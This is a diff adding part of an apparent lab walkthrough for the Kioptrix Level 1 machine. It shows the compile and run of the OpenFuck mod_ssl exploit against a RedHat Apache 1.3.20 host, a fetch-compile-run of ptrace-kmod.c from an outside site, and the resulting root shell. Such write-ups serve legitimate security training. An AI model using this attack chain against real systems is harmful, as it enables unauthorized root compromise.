@@ -141,4 +141,91 @@ Copied to: /root/764.c
                 <span class="out-green">SSL3_MT_SERVER_DONE</span>
 </pre>
 
-This can be solved by running <code>apt-get install libssl1.0-dev</code>. This allows 
+This can be solved by running <code>apt-get install libssl1.0-dev</code>. This allows us to run the exploit, which displays a list of possible targets, and telling from the infromation gathered by <code>nikto</code> (RedHat running Apache 1.3.20), 2 results match the host:
+
+<pre class="console-output">
+<span class="prompt">root@kali</span>:<span class="dir">~</span># gcc -o OpenFuck 764.c -lcrypto
+<span class="prompt">root@kali</span>:<span class="dir">~</span># ./OpenFuckV2
+
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+: Usage: ./OpenFuckV2 target box [port] [-c N]
+
+  target - supported box eg: 0x00
+  box - hostname or IP address
+  port - port for ssl connection
+  -c open N connections. (use range 40-50 if u dont know)
+  
+
+  Supported OffSet:
+	0x00 - Caldera OpenLinux (apache-1.3.26)
+	0x01 - Cobalt Sun 6.0 (apache-1.3.12)
+ ... ( other exploit output ) ...
+	<span class="out-highlight">0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
+	0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2</span>
+ ... ( other exploit output ) ...
+	0x89 - SuSE Linux 8.0 (apache-1.3.23-137)
+	0x8a - Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)
+
+Fuck to all guys who like use lamah ddos. Read SRC to have no surprise
+</pre>
+
+After some unsuccessful attempts, running the exploit with the <code>0x6b</code> offset does the trick:
+
+<pre class="console-output">
+<span class="prompt">root@kali</span>:<span class="dir">~</span># ./OpenFuckV2 0x6b 192.168.201.132 443 -c 50
+
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Connection... 50 of 50
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f8050
+Ready to send shellcode
+Spawning shell...
+bash: no job control in this shell
+bash-2.05$ 
+exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304- 
+--19:03:42--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           => `ptrace-kmod.c'
+Connecting to dl.packetstormsecurity.net:80... connected!
+HTTP request sent, awaiting response... 301 Moved Permanently
+Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
+--19:03:42--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           => `ptrace-kmod.c'
+Connecting to dl.packetstormsecurity.net:443... connected!
+HTTP request sent, awaiting response... 200 OK
+Length: 3,921 [text/x-csrc]
+
+    0K ...                                                   100% @   3.74 MB/s
+
+19:03:43 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]
+
+[+] Attached to 1498
+[+] Signal caught
+[+] Shellcode placed at 0x4001189d
+[+] Now wait for suid shell...
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+hostname
+kioptrix.level1
+</pre>
+
+The exploit completes successfully and a root level shell is spawned.
+
+<h3>Exploitation:139/tcp netbios-ssn</h3>
